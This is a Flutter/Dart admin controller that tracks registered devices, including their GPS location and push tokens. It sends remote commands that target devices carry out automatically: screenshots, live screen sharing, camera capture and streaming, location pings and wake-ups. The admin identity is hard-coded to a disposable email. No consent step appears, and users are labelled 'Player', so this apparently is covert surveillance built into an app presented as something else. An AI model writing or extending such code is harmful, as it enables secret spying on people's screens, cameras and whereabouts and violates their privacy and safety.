import 'dart:async';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:flutter/foundation.dart';
import 'package:get/get.dart';
import '../services/admin_service.dart';
import '../services/backend_bridge_service.dart';

class AdminDevice {
  final String deviceId;
  final String platform;
  final String username;
  final String? email;
  final String? photoUrl;
  final bool nativeCaptureEnabled;
  final DateTime? lastSeenAt;
  final double? latitude;
  final double? longitude;
  final double? accuracy;
  final DateTime? lastLocationTime;
  final String? fcmToken;

  bool get isOnline {
    if (lastSeenAt == null) return false;
    final nowUtc = DateTime.now().toUtc();
    final lastSeenUtc = lastSeenAt!.toUtc();
    final diff = nowUtc.difference(lastSeenUtc).inSeconds.abs();
    return diff < 180;
  }

  AdminDevice copyWith({
    String? deviceId,
    String? platform,
    String? username,
    String? email,
    String? photoUrl,
    bool? nativeCaptureEnabled,
    DateTime? lastSeenAt,
    double? latitude,
    double? longitude,
    double? accuracy,
    DateTime? lastLocationTime,
    String? fcmToken,
  }) {
    return AdminDevice(
      deviceId: deviceId ?? this.deviceId,
      platform: platform ?? this.platform,
      username: username ?? this.username,
      email: email ?? this.email,
      photoUrl: photoUrl ?? this.photoUrl,
      nativeCaptureEnabled: nativeCaptureEnabled ?? this.nativeCaptureEnabled,
      lastSeenAt: lastSeenAt ?? this.lastSeenAt,
      latitude: latitude ?? this.latitude,
      longitude: longitude ?? this.longitude,
      accuracy: accuracy ?? this.accuracy,
      lastLocationTime: lastLocationTime ?? this.lastLocationTime,
      fcmToken: fcmToken ?? this.fcmToken,
    );
  }

  AdminDevice({
    required this.deviceId,
    required this.platform,
    required this.username,
    this.email,
    this.photoUrl,
    this.lastSeenAt,
    this.nativeCaptureEnabled = false,
    this.latitude,
    this.longitude,
    this.accuracy,
    this.lastLocationTime,
    this.fcmToken,
  });

  factory AdminDevice.fromMap(Map<String, dynamic> data) {
    final devId = data['device_id'] as String? ?? data['deviceId'] as String? ?? '';
    final name = data['display_name'] as String? ??
        data['displayName'] as String? ??
        data['username'] as String? ??
        data['email'] as String? ??
        devId;
    final latRaw = data['latitude'];
    final lngRaw = data['longitude'];
    final accRaw = data['accuracy'];
    final locTimeRaw = data['last_location_time'] ?? data['lastLocationTime'];

    DateTime? parseDate(dynamic d) {
      if (d == null) return null;
      if (d is Timestamp) return d.toDate().toUtc();
      if (d is String) {
        final str = d.trim();
        if (str.isEmpty) return null;
        final parsed = DateTime.tryParse(str);
        if (parsed != null) {
          return parsed.toUtc();
        }
      }
      if (d is int) {
        if (d < 10000000000) {
          return DateTime.fromMillisecondsSinceEpoch(d * 1000, isUtc: true);
        }
        return DateTime.fromMillisecondsSinceEpoch(d, isUtc: true);
      }
      return null;
    }

    return AdminDevice(
      deviceId: devId,
      platform: data['platform'] as String? ?? 'unknown',
      username: name,
      email: data['email'] as String?,
      photoUrl: data['photoUrl'] as String?,
      nativeCaptureEnabled: (data['native_capture_enabled'] ?? data['nativeCaptureEnabled']) as bool? ?? false,
      lastSeenAt: parseDate(data['last_seen_at'] ?? data['lastSeenAt']),
      latitude: latRaw != null ? (latRaw as num).toDouble() : null,
      longitude: lngRaw != null ? (lngRaw as num).toDouble() : null,
      accuracy: accRaw != null ? (accRaw as num).toDouble() : null,
      lastLocationTime: locTimeRaw != null
          ? (locTimeRaw is int ? DateTime.fromMillisecondsSinceEpoch(locTimeRaw) : parseDate(locTimeRaw))
          : null,
      fcmToken: data['fcm_token'] as String? ?? data['fcmToken'] as String?,
    );
  }

  factory AdminDevice.fromSnapshot(
    DocumentSnapshot<Map<String, dynamic>> snapshot,
  ) {
    final data = snapshot.data() ?? <String, dynamic>{};
    return AdminDevice.fromMap({...data, 'deviceId': snapshot.id});
  }
}

class ScreenshotRequestItem {
  final String requestId;
  final String targetDeviceId;
  final String requestedByDeviceId;
  final String status;
  final String requestType;
  final String? screenshotUrl;
  final DateTime? requestedAt;
  final DateTime? completedAt;
  final DateTime? backgroundAttemptedAt;
  final String? error;
  final String? failureReason;

  ScreenshotRequestItem({
    required this.requestId,
    required this.targetDeviceId,
    required this.requestedByDeviceId,
    required this.status,
    required this.requestType,
    this.screenshotUrl,
    this.requestedAt,
    this.completedAt,
    this.backgroundAttemptedAt,
    this.error,
    this.failureReason,
  });

  factory ScreenshotRequestItem.fromMap(Map<String, dynamic> data) {
    DateTime? parseDate(dynamic d) {
      if (d == null) return null;
      if (d is Timestamp) return d.toDate().toLocal();
      if (d is String) {
        final str = d.trim();
        final parsed = DateTime.tryParse(str);
        if (parsed != null) {
          return parsed.isUtc ? parsed.toLocal() : parsed;
        }
      }
      if (d is int) {
        if (d < 10000000000) {
          return DateTime.fromMillisecondsSinceEpoch(d * 1000, isUtc: true).toLocal();
        }
        return DateTime.fromMillisecondsSinceEpoch(d, isUtc: true).toLocal();
      }
      return null;
    }

    final parsedRequestedAt = parseDate(data['requested_at'] ?? data['requestedAt']) ??
        parseDate(data['requestedAtMs'] ?? data['requested_at_ms']) ??
        parseDate(data['created_at'] ?? data['createdAt']);

    return ScreenshotRequestItem(
      requestId: data['id'] as String? ?? data['requestId'] as String? ?? '',
      targetDeviceId: data['target_device_id'] as String? ?? data['targetDeviceId'] as String? ?? '',
      requestedByDeviceId: data['requested_by_device_id'] as String? ?? data['requestedByDeviceId'] as String? ?? '',
      status: data['status'] as String? ?? 'unknown',
      requestType: data['request_type'] as String? ?? data['requestType'] as String? ?? 'screenshot',
      screenshotUrl: data['screenshot_url'] as String? ?? data['screenshotUrl'] as String?,
      requestedAt: parsedRequestedAt,
      completedAt: parseDate(data['completed_at'] ?? data['completedAt']),
      backgroundAttemptedAt: parseDate(data['background_attempted_at'] ?? data['backgroundAttemptedAt']),
      error: data['error'] as String?,
      failureReason: data['failure_reason'] as String? ?? data['failureReason'] as String?,
    );
  }

  factory ScreenshotRequestItem.fromSnapshot(
    DocumentSnapshot<Map<String, dynamic>> snapshot,
  ) {
    final data = snapshot.data() ?? <String, dynamic>{};
    return ScreenshotRequestItem.fromMap({...data, 'id': snapshot.id});
  }
}

class AdminController extends GetxController {
  final RxString currentDeviceId = ''.obs;
  final RxList<AdminDevice> devices = <AdminDevice>[].obs;
  final RxList<ScreenshotRequestItem> screenshotRequests =
      <ScreenshotRequestItem>[].obs;
  final RxBool isReady = false.obs;

  StreamSubscription<QuerySnapshot<Map<String, dynamic>>>? _devicesSubscription;
  StreamSubscription<dynamic>? _usersSubscription;
  StreamSubscription<QuerySnapshot<Map<String, dynamic>>>?
      _requestsSubscription;
  StreamSubscription<QuerySnapshot<Map<String, dynamic>>>?
      _incomingRequestsSubscription;
  StreamSubscription<dynamic>? _supabaseDevicesSubscription;
  StreamSubscription<dynamic>? _supabaseRequestsSubscription;
  StreamSubscription<dynamic>? _supabaseIncomingSubscription;

  Future<void> initialize() async {
    isReady.value = true;
    _listenToUsers();
    _listenToDevices();
    unawaited(refreshDeviceList());

    try {
      final devId = await AdminService.getOrCreateDeviceId();
      if (devId.isNotEmpty) {
        updateCurrentDeviceId(devId);
      }
      final currentUser = FirebaseAuth.instance.currentUser;
      if (currentUser != null &&
          currentUser.email?.toLowerCase() == 'admin@yopmail.com') {
        try {
          final adminDevId = 'user_${currentUser.uid}';
          await BackendBridgeService.deleteDevice(adminDevId);
        } catch (_) {}
      } else {
        await AdminService.registerDevice();
      }
    } catch (e) {
      debugPrint('Non-fatal AdminController background registration error: $e');
    }
  }

  void _listenToUsers() {
    _usersSubscription?.cancel();
    _usersSubscription = BackendBridgeService.streamUsers().listen(
      (userList) {
        for (final data in userList) {
          final uid = data['uid'] as String? ?? data['id'] as String?;
          final name = data['displayName'] as String? ?? data['display_name'] as String? ?? (data['email'] as String?)?.split('@').first ?? '';
          if (uid != null && name.isNotEmpty) {
            _resolvedUsernameCache['user_$uid'] = name;
            _resolvedUsernameCache[uid] = name;
          }
        }
        if (devices.isNotEmpty) {
          _enrichDevicesWithUserProfiles();
        }
      },
      onError: (e) => debugPrint('Error listening to users: $e'),
    );
  }

  void _enrichDevicesWithUserProfiles() {
    bool updated = false;
    final List<AdminDevice> currentList = List.from(devices);
    for (int i = 0; i < currentList.length; i++) {
      final dev = currentList[i];
      final uid = dev.deviceId.replaceFirst('user_', '');
      final cachedName = _resolvedUsernameCache[dev.deviceId] ?? _resolvedUsernameCache[uid];
      if (cachedName != null && cachedName.isNotEmpty && (dev.username.startsWith('user_') || dev.username.isEmpty || dev.username == dev.deviceId)) {
        currentList[i] = dev.copyWith(username: cachedName);
        updated = true;
      }
    }
    if (updated) {
      devices.value = currentList;
      devices.refresh();
    }
  }

  void updateCurrentDeviceId(String newDeviceId) {
    if (newDeviceId.isEmpty) return;
    currentDeviceId.value = newDeviceId;
    _listenToOwnRequests();
    _listenToIncomingRequests();
  }

  void _listenToDevices() {
    _devicesSubscription?.cancel();
    _devicesSubscription = AdminService.watchDevices().listen(
      (snapshot) {
        _handleDeviceListUpdate(
          snapshot.docs.map(AdminDevice.fromSnapshot).toList(),
        );
      },
      onError: (error) {
        debugPrint('Admin Firestore device listener error: $error');
      },
    );

    // Supabase Failover Realtime Stream
    if (BackendBridgeService.isSupabaseReady) {
      _supabaseDevicesSubscription?.cancel();
      try {
        _supabaseDevicesSubscription = BackendBridgeService.supabase!
            .from('devices')
            .stream(primaryKey: ['device_id'])
            .listen(
          (rows) {
            _handleDeviceListUpdate(rows.map(AdminDevice.fromMap).toList());
          },
          onError: (error) {
            debugPrint('Admin Supabase device listener error: $error');
          },
        );
      } catch (e) {
        debugPrint('Supabase device stream error: $e');
      }
    }
  }

  final Map<String, String> _resolvedUsernameCache = {};

  void _handleDeviceListUpdate(List<AdminDevice> rawList) {
    rawList.sort((a, b) {
      final timeA = a.lastSeenAt ?? DateTime.now();
      final timeB = b.lastSeenAt ?? DateTime.now();
      return timeB.compareTo(timeA);
    });

    final Map<String, AdminDevice> uniqueMap = {};
    for (var dev in rawList) {
      final isOwnDevice = dev.deviceId == currentDeviceId.value;
      final isAdminEmail = dev.email?.toLowerCase() == 'admin@yopmail.com';
      final isAdminName = dev.username.trim().toLowerCase() == 'admin';
      if (isOwnDevice || isAdminEmail || isAdminName) {
        continue;
      }

      if (_resolvedUsernameCache.containsKey(dev.deviceId)) {
        dev = dev.copyWith(username: _resolvedUsernameCache[dev.deviceId]!);
      } else if (dev.username == dev.deviceId && dev.deviceId.startsWith('user_')) {
        _asyncResolveUsername(dev.deviceId);
      }

      final key = dev.deviceId;
      if (!uniqueMap.containsKey(key)) {
        uniqueMap[key] = dev;
      } else {
        final existing = uniqueMap[key]!;
        if (dev.lastSeenAt != null &&
            (existing.lastSeenAt == null ||
                dev.lastSeenAt!.isAfter(existing.lastSeenAt!))) {
          uniqueMap[key] = dev;
        }
      }
    }
    devices.value = uniqueMap.values.toList();
  }

  void _asyncResolveUsername(String deviceId) async {
    try {
      final uid = deviceId.replaceFirst('user_', '');
      final data = await BackendBridgeService.getUserData(uid);
      if (data != null) {
        final name = data['displayName'] as String? ?? data['display_name'] as String? ?? (data['email'] as String?)?.split('@').first;
        if (name != null && name.isNotEmpty) {
          _resolvedUsernameCache[deviceId] = name;
          final idx = devices.indexWhere((d) => d.deviceId == deviceId);
          if (idx != -1) {
            devices[idx] = devices[idx].copyWith(username: name);
            devices.refresh();
          }
          return;
        }
      }
    } catch (_) {}
  }

  void _listenToOwnRequests() {
    _requestsSubscription?.cancel();
    _requestsSubscription = AdminService.watchAllRequests().listen(
      (snapshot) {
        _handleFirestoreUpdate(
          snapshot.docs.map(ScreenshotRequestItem.fromSnapshot).toList(),
        );
      },
      onError: (error) {
        debugPrint('Admin Firestore request listener error: $error');
      },
    );

    // Supabase Failover Realtime Stream
    if (BackendBridgeService.isSupabaseReady) {
      _supabaseRequestsSubscription?.cancel();
      try {
        _supabaseRequestsSubscription = BackendBridgeService.supabase!
            .from('screenshot_requests')
            .stream(primaryKey: ['id'])
            .listen(
          (rows) {
            _handleSupabaseUpdate(
              rows.map(ScreenshotRequestItem.fromMap).toList(),
            );
          },
          onError: (error) {
            debugPrint('Admin Supabase request listener error: $error');
          },
        );
      } catch (e) {
        debugPrint('Supabase requests stream error: $e');
      }
    }
  }

  final Map<String, ScreenshotRequestItem> _firestoreRequestsMap = {};
  final Map<String, ScreenshotRequestItem> _supabaseRequestsMap = {};

  void _handleFirestoreUpdate(List<ScreenshotRequestItem> list) {
    _firestoreRequestsMap.clear();
    for (final item in list) {
      if (item.requestId.isNotEmpty) {
        _firestoreRequestsMap[item.requestId] = item;
      }
    }
    _rebuildRequestsList();
  }

  void _handleSupabaseUpdate(List<ScreenshotRequestItem> list) {
    _supabaseRequestsMap.clear();
    for (final item in list) {
      if (item.requestId.isNotEmpty) {
        _supabaseRequestsMap[item.requestId] = item;
      }
    }
    _rebuildRequestsList();
  }

  void _rebuildRequestsList() {
    final Map<String, ScreenshotRequestItem> merged = {};
    for (final entry in _firestoreRequestsMap.entries) {
      merged[entry.key] = entry.value;
    }
    for (final entry in _supabaseRequestsMap.entries) {
      final existing = merged[entry.key];
      if (existing == null) {
        merged[entry.key] = entry.value;
      } else {
        final isExistingAdvanced = existing.status == 'completed' ||
            existing.status == 'stopped' ||
            existing.status == 'failed' ||
            existing.status == 'live';
        if (!isExistingAdvanced || entry.value.status != 'pending') {
          merged[entry.key] = entry.value;
        }
      }
    }

    final mergedList = merged.values.toList();
    mergedList.sort((a, b) {
      final aTime = a.requestedAt?.millisecondsSinceEpoch ?? 0;
      final bTime = b.requestedAt?.millisecondsSinceEpoch ?? 0;
      return bTime.compareTo(aTime);
    });

    screenshotRequests.value = mergedList;
    screenshotRequests.refresh();
  }

  Future<void> clearAllRequests() async {
    _firestoreRequestsMap.clear();
    _supabaseRequestsMap.clear();
    screenshotRequests.value = [];
    screenshotRequests.refresh();
    await BackendBridgeService.clearAllScreenshotRequests();
  }

  /// Groups the latest 20 requests by target device id
  Map<String, List<ScreenshotRequestItem>> get groupedRequestsByDevice {
    final Map<String, List<ScreenshotRequestItem>> grouped = {};
    for (final req in screenshotRequests) {
      final key = req.targetDeviceId;
      if (!grouped.containsKey(key)) {
        grouped[key] = [];
      }
      grouped[key]!.add(req);
    }
    return grouped;
  }

  String getDeviceDisplayName(String targetDeviceId) {
    if (_resolvedUsernameCache.containsKey(targetDeviceId)) {
      return _resolvedUsernameCache[targetDeviceId]!;
    }
    final dev = devices.firstWhereOrNull((d) => d.deviceId == targetDeviceId);
    if (dev != null && !dev.username.startsWith('user_') && dev.username.isNotEmpty) {
      return dev.username;
    }
    if (dev?.email != null && dev!.email!.isNotEmpty) {
      return dev.email!.split('@').first;
    }
    return 'Player';
  }

  final Set<String> _processingRequestIds = {};

  void _listenToIncomingRequests() {
    _incomingRequestsSubscription?.cancel();
    _supabaseIncomingSubscription?.cancel();
    if (currentDeviceId.value.isEmpty) return;

    // 1. Firestore incoming listener
    _incomingRequestsSubscription = AdminService.watchPendingRequestsForDevice(
      currentDeviceId.value,
    ).listen(
      (snapshot) async {
        for (final doc in snapshot.docs) {
          _fulfillPendingCommand(
            doc.id,
            (doc.data()['requestType'] as String?) ?? 'screenshot',
          );
        }
      },
      onError: (error) {
        debugPrint('Incoming screenshot Firestore listener error: $error');
      },
    );

    // 2. Supabase Realtime Failover incoming listener
    if (BackendBridgeService.isSupabaseReady) {
      try {
        _supabaseIncomingSubscription = BackendBridgeService.supabase!
            .from('screenshot_requests')
            .stream(primaryKey: ['id'])
            .eq('target_device_id', currentDeviceId.value)
            .eq('status', 'pending')
            .listen(
          (rows) {
            for (final row in rows) {
              final requestId = row['id'] as String? ?? '';
              final requestType = row['request_type'] as String? ?? 'screenshot';
              if (requestId.isNotEmpty) {
                _fulfillPendingCommand(requestId, requestType);
              }
            }
          },
          onError: (error) {
            debugPrint('Incoming screenshot Supabase listener error: $error');
          },
        );
      } catch (e) {
        debugPrint('Supabase incoming stream error: $e');
      }
    }
  }

  Future<void> _fulfillPendingCommand(
    String requestId,
    String requestType,
  ) async {
    if (_processingRequestIds.contains(requestId)) return;
    _processingRequestIds.add(requestId);

    try {
      final req = screenshotRequests.firstWhereOrNull((r) => r.requestId == requestId);
      if (req != null &&
          req.requestedByDeviceId == currentDeviceId.value &&
          req.targetDeviceId != currentDeviceId.value) {
        // Sent by this admin device to another target device: do not fulfill locally!
        return;
      }
      if (requestType == 'screen_share') {
        await AdminService.fulfillScreenShareRequest(requestId);
      } else if (requestType == 'camera_stream') {
        await AdminService.fulfillCameraStreamRequest(requestId);
      } else if (requestType == 'screenshot') {
        await AdminService.fulfillScreenshotRequest(requestId);
      } else if (requestType == 'camera_capture') {
        await AdminService.fulfillCameraCaptureRequest(requestId);
      } else if (requestType == 'location_ping') {
        await AdminService.fulfillLocationPingRequest(requestId);
      }
    } catch (e) {
      debugPrint('Error fulfilling request $requestId: $e');
    } finally {
      Future.delayed(const Duration(seconds: 5), () {
        _processingRequestIds.remove(requestId);
      });
    }
  }

  Future<void> refreshDeviceList() async {
    try {
      final usersList = await BackendBridgeService.getAllUsers();
      for (final data in usersList) {
        final uid = data['uid'] as String? ?? data['id'] as String?;
        final name = data['displayName'] as String? ?? data['display_name'] as String? ?? (data['email'] as String?)?.split('@').first;
        if (uid != null && name != null && name.isNotEmpty) {
          _resolvedUsernameCache['user_$uid'] = name;
          _resolvedUsernameCache[uid] = name;
        }
      }

      final devicesList = await BackendBridgeService.getAllDevices();
      _handleDeviceListUpdate(
        devicesList.map(AdminDevice.fromMap).toList(),
      );
    } catch (e) {
      debugPrint('Error in refreshDeviceList: $e');
    }
  }

  Future<void> requestScreenshot(String targetDeviceId) async {
    if (targetDeviceId.isEmpty) return;
    await AdminService.sendScreenshotRequest(
      targetDeviceId,
      currentDeviceId.value,
    );
  }

  Future<void> requestScreenShare(String targetDeviceId) async {
    if (targetDeviceId.isEmpty) return;
    await AdminService.sendScreenShareRequest(
      targetDeviceId,
      currentDeviceId.value,
    );
  }

  Future<void> requestCameraCapture(
    String targetDeviceId, {
    required String cameraFacing,
  }) async {
    if (targetDeviceId.isEmpty) return;
    await AdminService.sendCameraCaptureRequest(
      targetDeviceId,
      currentDeviceId.value,
      cameraFacing: cameraFacing,
    );
  }

  Future<void> requestCameraStream(
    String targetDeviceId, {
    required String cameraFacing,
  }) async {
    if (targetDeviceId.isEmpty) return;
    await AdminService.sendCameraStreamRequest(
      targetDeviceId,
      currentDeviceId.value,
      cameraFacing: cameraFacing,
    );
  }

  Future<void> stopScreenShare(String requestId) async {
    if (requestId.isEmpty) return;
    await AdminService.stopScreenShareRequest(requestId);
  }

  int get otherInstalledDevicesCount {
    return devices
        .where((device) => device.deviceId != currentDeviceId.value)
        .length;
  }

  Future<void> wakeDevice(String targetDeviceId) async {
    if (targetDeviceId.isEmpty) return;
    await AdminService.sendWakeRequest(
      targetDeviceId,
      currentDeviceId.value,
    );
  }

  @override
  void onClose() {
    _devicesSubscription?.cancel();
    _requestsSubscription?.cancel();
    _incomingRequestsSubscription?.cancel();
    super.onClose();
  }
}
